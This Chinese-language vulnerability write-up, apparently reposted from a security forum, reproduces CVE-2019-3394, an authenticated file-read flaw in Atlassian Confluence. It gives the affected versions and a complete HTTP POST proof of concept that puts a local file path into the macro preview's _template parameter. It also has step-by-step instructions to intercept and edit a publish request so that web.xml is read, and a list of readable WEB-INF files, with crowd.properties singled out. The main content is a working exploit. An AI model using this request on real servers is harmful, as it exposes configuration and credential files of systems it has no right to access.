# （CVE-2019-3394）Confluence 文件读取漏洞

> 原文：[https://www.zhihuifly.com/t/topic/2855](https://www.zhihuifly.com/t/topic/2855)

# （CVE-2019-3394）Confluence 文件读取漏洞

## 一、漏洞简介

> （CVE-2019-3394）Confluence 文件读取漏洞

## 二、影响范围

*   6.1.0 <= version < 6.6.16
*   6.7.0 <= version < 6.13.7
*   6.14.0 <= version < 6.15.8

## 三、复现过程

#### poc

```
POST /rest/tinymce/1/macro/preview  HTTP/1.1
Host: localhost:8090
Content-Length: 175
Accept: text/plain, */*; q=0.01 
Origin: http://localhost:8090
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36 
Content-Type: application/json; charset=UTF-8
Referer: http://localhost:8090/ 
Connection: close `{“contentId”:“1”,“macro”:{“name”:“widget”,“params”: {“url”:“[https://www.viddler.com/v/test",“width”:“1000”,“height”:“1000”,"_templat](https://www.viddler.com/v/test%22,%22width%22:%221000%22,%22height%22:%221000%22,%22_templat) e”:“file:///C:/Windows/win.ini”},“body”:""}}` 
```

#### 触发条件

1.  一个有效的登录账号
2.  该账号具有在空间「添加页面」的权限

#### 复现步骤

1.创建一个空白页

![image](img/7dec71d3ebc5cc1d83a404a471ffb758.png)

2.插入一张网络图片

![image](img/3a53e4164bec2ba73b472b1ba08963ab.png)

![image](img/e701ec80ee32ecca75bca5c846ed7877.png)

> 插入url改为你需要查看的文件，例如 /packages/../web.xml

3.点击发布，抓取报文

4.删除多余url前缀,只留下 `/packages/../web.xml` 并放开报文

![image](img/26d1dde19ee727d0da357868dd41fdd3.png)

5.查看页面源码确认修改成功

![image](img/02fa5e59e27458332f59cf591e6aeeb6.png)

6.导出word，并抓包查看

![image](img/ce79e7a00cbb9860b906cbc0f43ccdd9.png)

![image](img/f5a083edf54a79b3b71b37b0365a643e.png)

#### 路径说明

由于 `catalina.jar`中的 `org.apache.catalina.webresources.StandardRoot.class`的 getResource方法的 `validate`存在过滤和限制，所以可遍历路径均在 `/WEB-INF`下

可读取的文件大致如下

```
#WEB-INF下
decorators.xml
glue-config.xml
server-config.wsdd
sitemesh.xml
urlrewrite.xml
web.xml
#/WEB-INF/classes下
confluence-filtered-frames.properties
confluence-init.properties
crowd.properties(较为重要)
hash-registry.properties
lgplTemplate.soy
log4j-diagnostic.properties
log4j.properties
logging.properties
mime.types
osuser.xml
seraph-config.xml
seraph-paths.xml
velocity_implicit.vm
velocity.properties 
```